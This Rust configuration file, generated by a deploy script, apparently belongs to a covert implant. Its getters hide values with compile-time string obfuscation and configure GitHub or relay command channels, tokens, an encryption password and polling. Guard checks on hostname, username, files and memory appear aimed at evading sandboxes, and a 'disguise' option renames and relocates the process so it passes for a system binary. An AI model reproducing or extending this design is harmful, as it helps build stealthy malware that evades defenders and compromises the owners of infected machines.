// Auto-written by the generator — do not edit manually.
// This file is overwritten on every deploy.sh run.
//
// All values are obfuscated with obfstr! at compile time.
// deploy.sh must write values INSIDE the obfstr!() macro call.
// Example:  pub fn github_token() -> String { obfstr::obfstr!("ghp_real_token").to_string() }

pub fn channel_type() -> String { obfstr::obfstr!("github").to_string() }
pub fn github_token() -> String { obfstr::obfstr!("").to_string() }
pub fn github_repo() -> String { obfstr::obfstr!("").to_string() }
pub fn encryption_password() -> String { obfstr::obfstr!("").to_string() }
pub fn backup_url() -> String { obfstr::obfstr!("").to_string() }
pub fn poll_interval() -> String { obfstr::obfstr!("").to_string() }
#[allow(dead_code)]
pub fn time_window() -> String { obfstr::obfstr!("").to_string() }
#[allow(dead_code)]
pub fn enable_debug() -> String { obfstr::obfstr!("0").to_string() }
#[allow(dead_code)] pub fn guard_hostname() -> String { obfstr::obfstr!("").to_string() }
#[allow(dead_code)] pub fn guard_username() -> String { obfstr::obfstr!("").to_string() }
#[allow(dead_code)] pub fn guard_file_exists() -> String { obfstr::obfstr!("").to_string() }
#[allow(dead_code)] pub fn guard_min_memory_mb() -> String { obfstr::obfstr!("").to_string() }
/// Operator-defined disguise (empty = auto-pick by distro). Process name is
/// the comm shown in ps/top (kernel truncates to 15 chars); path is where the
/// relocated binary lives (absolute; must not be a running system binary).
#[allow(dead_code)] pub fn proc_name() -> String { obfstr::obfstr!("").to_string() }
#[allow(dead_code)] pub fn proc_path() -> String { obfstr::obfstr!("").to_string() }
/// Worker relay config (empty = use runtime env only). The Builder fills
/// these when channel=worker so the compiled binary is self-contained.
#[allow(dead_code)] pub fn worker_urls() -> String { obfstr::obfstr!("").to_string() }
#[allow(dead_code)] pub fn worker_secret() -> String { obfstr::obfstr!("").to_string() }
#[allow(dead_code)] pub fn worker_path() -> String { obfstr::obfstr!("").to_string() }
/// Build identity (项 9 版本自上报)：builder 注入版本/发布标识，空 = 未注入。
#[allow(dead_code)] pub fn version() -> String { obfstr::obfstr!("").to_string() }
#[allow(dead_code)] pub fn release_id() -> String { obfstr::obfstr!("").to_string() }
/// 双通道故障切换参数（项 2 控制面板）：空/0 = 用 failover.rs 内置默认（3 / 5）。
#[allow(dead_code)] pub fn failover_threshold() -> String { obfstr::obfstr!("").to_string() }
#[allow(dead_code)] pub fn probe_after_oks() -> String { obfstr::obfstr!("").to_string() }
